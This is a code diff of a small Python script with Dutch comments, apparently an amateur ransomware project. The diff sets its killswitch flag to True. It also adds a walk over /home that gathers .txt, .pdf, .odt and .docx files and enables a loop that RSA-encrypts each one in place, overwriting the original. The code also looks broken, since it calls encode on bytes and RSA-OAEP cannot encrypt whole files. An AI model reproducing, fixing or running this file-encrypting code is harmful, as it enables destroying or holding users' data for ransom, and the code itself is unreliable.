@@ -5,7 +5,7 @@ import base64
 import os
 
 #Killswitch Functie
-Killswitch = False
+Killswitch = True
 
 if Killswitch==True:
     exit()
@@ -24,32 +24,23 @@ cipher_rsa = PKCS1_OAEP.new(RSA_key)
 
 #Hier zoek functie
 #Def var voor opslaan van lijstdata van zoekfunctie.
-"""
-mylist = glob.glob("*.txt",recursive=True)  
-mylist.append(glob.glob("*.pdf",recursive=True))  
-mylist.append(glob.glob("*.xml",recursive=True))
-mylist.append(glob.glob("*.ods",recursive=True)) 
-mylist.append(glob.glob("*.odt",recursive=True)) 
-mylist.append(glob.glob("*.docx",recursive=True)) 
-"""
+bestandenlijst = []
 # Using os.walk()
 for dirpath, dirs, files in os.walk('/home'): 
   for filename in files:
     fname = os.path.join(dirpath,filename)
     if fname.endswith('.txt') or fname.endswith('.pdf') or fname.endswith('.odt') or fname.endswith('.docx'):
-      print(fname)
+      bestandenlijst.append(fname)
 
-#print(mylist)
-'''
+
 #Encryptiefunctie gebaseerd op lijst.
-for file in mylist:
+for file in bestandenlijst:
     with open(file, 'rb') as f:
         file_inhoud = f.read()
     versleutelde_data = cipher_rsa.encrypt(file_inhoud.encode("utf-8"))
     with open(file, 'wb') as f:
         f.write(versleutelde_data)
-#print(Encrypt_data)
-'''
+
 #Hier decrypt functie
 #RSA_key_decrypt = RSA.import_key("decrypt_key.key")
 
